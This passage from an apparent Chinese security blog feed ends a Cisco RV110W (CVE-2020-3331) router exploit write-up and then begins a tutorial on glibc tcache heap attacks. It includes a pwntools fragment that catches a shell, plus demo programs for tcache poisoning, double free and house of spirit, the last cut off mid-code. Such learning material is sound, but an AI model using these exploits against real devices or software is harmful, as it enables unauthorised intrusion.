class="line">thread.start_new_thread(attack,())</span><br><span class="line"><span class="comment">#开始一个新的线程，从attack函数开始运行 </span></span><br><span class="line">io.wait_for_connection()</span><br><span class="line"><span class="comment">#阻塞直到建立连接 </span></span><br><span class="line">log.success(<span class="string">&quot;getshell&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p>被<code>xuanxuan</code>老师带坑的第一个真实的IOT设备，复现之路异常坎坷，但不管怎么样最终还是复现出来了，学到不少知识，不过还有一些细节问题还没解决，后面慢慢看吧！加油，路还很长，任重而道远！</p><h4 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h4><p><a href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/">思科路由器 RV110W CVE-2020-3331 漏洞复现</a></p><p><a href="https://www.anquanke.com/post/id/159183">360代码卫士帮助思科公司修复多个产品高危安全漏洞（附详细技术分析）</a></p><p><a href="https://la13x.github.io/2021/08/31/Real-World-Cisco-RV110W/#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">强网杯2020决赛 Cisco RV110W路由器复现</a></p><p><a href="https://xiaoxin.zone/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/">思科路由器RV110W-CVE-2020-3331/CVE-2020-3323漏洞复现</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tache bin attack</title>
      <link href="/2021/10/05/tache-bin-attack/"/>
      <url>/2021/10/05/tache-bin-attack/</url>
      
        <content type="html"><![CDATA[<blockquote><p>一直以来都是做<code>libc-2.23</code>的堆题，<code>tache</code>也很少涉及，这次来系统的看一下<code>tache</code>这个在<code>libc-2.26</code>版本中新引入的机制到底是怎么样的？它有什么奇妙的玩法？一起来看看吧</p></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>tache新增了两个结构体，一个是 <strong>tcache_entry</strong> ，另一个是<strong>tcache_perthread_struct</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>有两个特别重要的函数，是关于<code>tache</code>链入和脱链的操作，可以看到<code>tache</code>链入和脱链的检查十分的少，跟<code>fastbin</code>相比真的不多，甚至可以说没有检查…，所以说<code>tache</code>的存在让堆利用更简单了一点，所以说不要怕，它并不可怕！</p><ul><li><code>fastbin</code>有对<code>size</code>进行检查，如果<code>size</code>不同放在同一个链表里面就会报错，<code>tache</code>没得</li><li><code>fastbin</code>有<code>double free</code>检查，在早期的<code>tache</code>中也没有</li></ul><p>链入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脱链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">tcache_get</span> <span class="params">(<span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先写个<code>demo</code>简单认识一下<code>tache</code>在<code>bin</code>中的怎么样的…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//查看tache</span></span><br><span class="line"><span class="keyword">void</span> *chunk_1,*chunk_2,*chunk_3,*chunk_4;</span><br><span class="line"><span class="keyword">void</span> *chunk_5,*chunk_6,*chunk_7;</span><br><span class="line"></span><br><span class="line">chunk_1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">chunk_4 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">chunk_5 = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">chunk_6 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">chunk_7 = <span class="built_in">malloc</span>(<span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(chunk_1);</span><br><span class="line"><span class="built_in">free</span>(chunk_2);</span><br><span class="line"><span class="built_in">free</span>(chunk_3);</span><br><span class="line"><span class="built_in">free</span>(chunk_4);</span><br><span class="line"><span class="built_in">free</span>(chunk_5);</span><br><span class="line"><span class="built_in">free</span>(chunk_6);</span><br><span class="line"><span class="built_in">free</span>(chunk_7);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//宏定义define TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后看<code>bin</code>，我们看到<code>fastbin</code>已经有了一个堆块，说明<code>tache</code>最多只能存放7个堆块，这也是<code>tache</code>可玩的机制之一</p><img src="/2021/10/05/tache-bin-attack/1.png" class=""><p>还记得<code>tcache_perthread_struct</code>这个结构体吗？系统为它分配了一个0x250的堆块来存放这个结构体的内容，我们来看看里面的内容，上面的小框框是记录堆块数量的，从0x20开始一直到0x400，一般的利用也到不了0x400，所以就没展示，下面的大框框就是各个大小的堆块首个堆块的地址，可以对比上图来看</p><img src="/2021/10/05/tache-bin-attack/2.jpg" class=""><p>引用wiki上的一段话</p><blockquote><p>在内存分配的<code>malloc</code>函数中有多处，会将内存块移入<code>tcache</code>中。</p><p>（1）首先，申请的内存块符合<code>fastbin</code>大小时并且在<code>fastbin</code>内找到可用的空闲块时，会把该<code>fastbin</code>链上的其他内存块放入<code>tcache</code>中。</p><p>（2）其次，申请的内存块符合<code>smallbin</code>大小时并且在<code>smallbin</code>内找到可用的空闲块时，会把该<code>smallbin</code>链上的其他内存块放入<code>tcache</code>中。</p><p>（3）当在<code>unsorted bin</code>链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到<code>tcache</code>中，继续处理。</p></blockquote><p>其实也很好理解，就是分配的时候会先从<code>tache</code>中取，然后把符合对应大小的堆块的整理到<code>tache</code>中，改一下上面的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"><span class="keyword">void</span> *c9,*c10;</span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c9 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"><span class="built_in">free</span>(c9);</span><br><span class="line"><span class="built_in">free</span>(c10);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);<span class="comment">//断点</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下断点之后，发现<code>malloc</code>三个堆块<code>fastbin</code>里面一个都没动，全部都是<code>tache</code>里面拿的</p><img src="/2021/10/05/tache-bin-attack/3.png" class=""><p>但是<code>tache</code>里面的拿完了之后，它就会去<code>fastbin</code>里面拿，拿了之后还没完还要把<code>fastbin</code>里面的堆块放到<code>tache</code>里面去，下面是代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"><span class="keyword">void</span> *c9,*c10;</span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c9 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"><span class="built_in">free</span>(c9);</span><br><span class="line"><span class="built_in">free</span>(c10);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);<span class="comment">//tache里面已经分配完</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/4.png" class=""><p>讲完了<code>tache</code>的一些原理性的东西，接下来看看如何攻击的：</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><h3 id="libc-2-27-so"><a href="#libc-2-27-so" class="headerlink" title="libc-2.27.so"></a>libc-2.27.so</h3><h4 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h4><p>拿<code>how2heap</code>的代码来演示，目的是任意地址分配，分配到栈上的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配两个堆块之后，修改<code>b</code>的<code>fd</code>指针指向栈，如下图所示：</p><img src="/2021/10/05/tache-bin-attack/6.png" class=""><p>再分配两个堆块就获得了栈的控制权</p><img src="/2021/10/05/tache-bin-attack/5.png" class=""><p>总结一下：由于<code>tache</code>并不会检查同一链表里面的堆块大小是否相等，所以才可以把栈指针链入<code>tache</code>，然后再分配出来，这比<code>fastbin attack</code>方便多啦！，<code>fastbin attack</code>还得检查堆块大小，所以<code>fastbin attack</code>都是把<code>__malloc_hook - 0x23</code>链入再分配出来，对吧！</p><h4 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h4><p>这个攻击手法已经不太适用了，<code>tache_dup</code>很简单，就<code>free</code>两次，不赘述了，因为补丁已经给到了<code>libc-2.27.so</code>，上次打一道<code>tache</code>的题，很疑惑，为啥我的<code>tache_dup</code>就报错了呢？后面找到下面这个资料：</p><p><a href="https://blog.csdn.net/easy_level1/article/details/115724038">[总结型]记CTF PWN中过气的堆利用</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, b, c);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h4><p>这个攻击手法看起来很离谱，只是单纯的一个数组并伪造了一个<code>size</code>，然后定义了一个指针指向了此数组的<code>&amp;fake_chunks[2]</code>，在<code>free</code>就把它给放进了<code>tache</code>…，原因是由于<code>tcache_put()</code>函数检查不严格造成的，在释放的时候没有检查被释放的指针是否真的是堆块的<code>malloc</code>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">fake_chunks[<span 